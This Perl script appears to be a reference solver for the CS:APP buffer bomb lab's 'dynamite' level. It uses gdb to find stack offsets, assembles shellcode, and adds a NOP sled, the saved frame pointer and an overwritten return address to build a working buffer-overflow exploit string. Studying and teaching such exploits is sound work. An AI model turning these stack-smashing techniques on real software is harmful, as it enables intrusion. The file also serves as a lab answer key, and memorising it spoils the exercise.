#!/usr/bin/perl 
#######################################################################
# boom.pl - automatically solves buffer bomb for dynamite level (3)
#
# Copyright (c) 2002-2011, R. Bryant and D. O'Hallaron, All rights reserved.
#
#######################################################################

use strict;
use Getopt::Std;
use lib ".";
use Solve;

$| = 1; # autoflush output on every print statement

# ---------------------------------------------------------------------
#
# Step 1: Initialize script
#
# ---------------------------------------------------------------------
#
# usage - print help message and terminate
#
sub usage 
{
    printf STDERR "$_[0]\n";
    printf STDERR "Usage: $0 [-h] -u <userid>\n";
    printf STDERR "  -u <userid>   User ID\n";
    printf STDERR "  -h            Print this message\n";
    die "\n";
}

my $flags;
my $gdbfile;
my $userid;
my $gdbout;
my $smoke;
my $padcount;
my $i;


$flags = "";

no strict;
getopts('hsu:');
if ($opt_h) {
    usage();
}

if (!$opt_u) {
    usage("Missing user ID (-u)\n");
}

if ($opt_s) {
    $flags = "-s";
}

$userid = $opt_u;
use strict 'vars';

# ---------------------------------------------------------------------
#
# Step 2: Generate a gdb command file
#
# ---------------------------------------------------------------------

$gdbfile = "boom-$userid.gdb";
open(GDB, ">$gdbfile") || die "Can't open GDB file $gdbfile\n";

print GDB <<GDBSTUFF;
break getbuf
break Gets
run -u $userid
print /a \$ebp+4
print /a *(void**)(\$ebp+4)
print /a *(void**)\$ebp
continue
print /a *(void**)(\$ebp+8)
quit
GDBSTUFF

close GDB;

# ---------------------------------------------------------------------
#
# Step 3: Run gdb with command file to extract runtime info about the
# bomb.
#
# ---------------------------------------------------------------------

$gdbout = `gdb -nw $Solve::EXECUTABLE -x $gdbfile | grep \"[0-9] = \"`
    || die "Couldn't run gdb with batch file $gdbfile\n";

# ---------------------------------------------------------------------
#
# Step 4: Parse gdb output to get offsets.
#
# ---------------------------------------------------------------------

$gdbout =~ s/\$[0-9]* = //g;
$gdbout =~ s/<[\w+]*>//g;

my ($return_address_location,
    $getbuf_return_address,
    $saved_frame_pointer,
    $buf_location) = split(/\n/, $gdbout);

my $padcount = hex($return_address_location) - hex($buf_location);
$padcount -= 4; # subtract 4 for saved ebp

print "/* getbuf return address at address: $return_address_location */\n";
print "/* getbuf saved frame pointer:       $saved_frame_pointer */\n";
print "/* Local buffer starts at address:   $buf_location */\n";
print "/* Padding required:                 $padcount bytes */\n";
print "\n";

# ---------------------------------------------------------------------
#
# Step 5: Use makecookie to generate cookie.
#
# ---------------------------------------------------------------------

my $cookie = `$Solve::BINDIR/makecookie $userid`;
chomp($cookie);

# ---------------------------------------------------------------------
#
# Step 6: Generate assembly code for exploit string.
#
# ---------------------------------------------------------------------

# shell code generation

my $asfile = "boom-$userid";
open(AS, ">$asfile.S") || die "Can't open assembly code file $asfile\n";

print AS <<ENDOF_SHELL_CODE;
    mov \$$cookie, %eax
    push \$$getbuf_return_address
    ret
ENDOF_SHELL_CODE
   
close AS;

system("gcc -m32 -c $asfile.S");
my $objdumpout = `objdump -d $asfile.o`;

$objdumpout =~ s/\n\n//g;
$objdumpout =~ s/\n//;

my @lines = split(/\n/, $objdumpout); 
my $linecount = scalar(@lines);
my $shellcodelength = 0;


for (my $i = 1; $i < $linecount; $i++)
{
    my $line, my $asm, my $opcodes;
    $line = $lines[$i];
    if ($line =~ /^[\s]*[\da-fA-F]+:/) {

	$line =~ s/[\s\w]*:\s*//g;   # remove addresses
	($opcodes = $line)   =~ s/\t[()-\s\w\$,%]*//g; # remove asm mnemonics

	my @bytes = split(/\W/, $opcodes);
	my $bytecount = scalar(@bytes);
	for (my $j = 0; $j < $bytecount; $j++)
	{
	    print "$bytes[$j] ";
	    $shellcodelength++;
	}

	($asm = $line) !~ s/.*\t//g;
	print " /* $asm */";
	print "\n";
    }
}
print "\n";


# padding

my $nopcount = $padcount - $shellcodelength;
for (my $i = 0; $i < $nopcount; $i++)
{
    print "90 ";
}
print "\n\n";

# saved frame pointer (used in test)

my $a = hex($saved_frame_pointer);


print "/* saved frame pointer */\n";
printf("\n%.2x %.2x %.2x %.2x\n",
       ($a >>  0) & 0xFF,
       ($a >>  8) & 0xFF,
       ($a >> 16) & 0xFF,
       ($a >> 24) & 0xFF,
       );


# return address (on stack)

my $b = hex($buf_location);


print "/* return address (back in test()) */";
printf("\n%.2x %.2x %.2x %.2x\n",
       ($b >>  0) & 0xFF,
       ($b >>  8) & 0xFF,
       ($b >> 16) & 0xFF,
       ($b >> 24) & 0xFF,
       );


